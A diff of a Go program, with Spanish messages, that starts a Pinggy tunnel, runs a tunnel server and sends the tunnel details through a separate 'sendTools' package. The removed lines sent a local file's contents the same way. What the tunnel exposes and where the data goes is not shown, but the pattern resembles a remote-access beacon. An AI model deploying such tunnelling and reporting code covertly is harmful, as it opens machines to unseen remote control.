@@ -2,39 +2,46 @@ package main
 
 import (
 	"fmt"
-	"os"
-	"strings"
-
-	//"net/http"
 	"time"
 	"windows/sendTools"
 	"windows/tunnel"
+
 )
 
 
 func main(){
-	fmt.Println("ASJDLAJSLDJALKSDJLAKJSDLKASJDLKJALSDAKDLA")
-
+	fmt.Println("Iniciando ")
 	
-	//re := tunnel.InitTunne()
-	tunnel.InitTunne()
+	info := make(chan tunnel.InfoTunnel)
+	
+	
+	go func (){
+
+		inf := tunnel.InitTunne()
+		info <- inf		
+	}()
+	msg := <- info
+	if(msg.Status == false){
+		fmt.Println("Error de pinggy")
+		fmt.Println(msg.Info)
+		return 
+	}
+	fmt.Println("Pinggy iniciado..")
+
 	go tunnel.ServerTunn()
+	
 
 
 	fmt.Println("Espera..")
 
 	sendTools.Send("Enviando datos....")
 	time.Sleep(10*time.Second)
-	datos, err := os.ReadFile("info.txt")
-	if(err != nil){
-		fmt.Println(err)
-	}
-	rep := string(strings.ReplaceAll(string(datos), " ", ""))
-	fmt.Println(rep)
-	re := sendTools.Send("INfooooo: "+rep)
+	
+	fmt.Println(msg)
+	re := sendTools.Send("INfooooo: "+msg.Info)
 	fmt.Println(re)
 		
-	
+	fmt.Println("running.....")
 	select{}
 
 }
